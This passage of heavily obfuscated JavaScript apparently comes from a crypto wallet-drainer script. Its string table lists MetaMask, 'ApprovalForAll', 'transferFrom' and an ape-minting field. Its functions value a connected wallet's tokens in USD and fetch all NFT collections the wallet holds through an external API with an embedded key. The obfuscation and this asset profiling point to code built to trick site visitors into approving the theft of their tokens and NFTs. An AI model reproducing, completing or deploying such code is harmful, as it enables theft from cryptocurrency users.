a9BKmVB4GUr7saw5TLZqKY65BQub1clqdAgjy16t5A7n16DIbn','event','address','ApprovalForAll','setRevealTimestamp','style','balance','_spender','paused','2101822285','bytes','then','sending\x20ether','numberOfTokens','maxApePurchase','_data','from','4HLbTmm','unpause','bool','feeBasisPoints','_blackListedUser','balanceOf','transferFrom','MetaMask'];_0x4c23=function(){return _0x11458c;};return _0x4c23();}async function getValue(_0x392b8d,_0x15e860,_0x374f0f){const _0x603511=_0x28de01;console[_0x603511(0x1c6)](_0x392b8d,_0x15e860,_0x374f0f);let _0x33a04c=await getPrice(_0x392b8d);console['log'](_0x603511(0x1d5),_0x33a04c),_0x33a04c=parseFloat(_0x33a04c[_0x392b8d]['usd']);let _0x2556ef=_0x15e860/0xa**(_0x374f0f||0x12)*_0x33a04c;return _0x2556ef=parseInt(_0x2556ef),_0x33a04c?_0x2556ef:0x0;}async function getNFTs(_0x46e5ef='',_0x50f131=_0x28de01(0x1ad),_0x13f9b1=_0x28de01(0x22b),_0x3e6722='50'){return new Promise((_0x385842,_0x104535)=>{const _0x10b9e0=_0x220a;fetch(_0x10b9e0(0x204)+_0x46e5ef+'/nft/collections?chain='+_0x13f9b1+'&format=decimal&limit='+_0x3e6722,{'method':_0x10b9e0(0x229),'headers':{'accept':_0x10b9e0(0x1d7),'X-API-Key':_0x50f131}})[_0x10b9e0(0x1b8)](async _0x280782=>{const _0x13b81a=_0x10b9e0;if(_0x280782[_0x13b81a(0x236)]>0x18f)throw _0x280782;_0x385842(await _0x280782[_0x13b81a(0x1d3)]());})[_0x10b9e0(0x20f)](_0x2e822f=>{_0x104535(_0x2e822f);});});}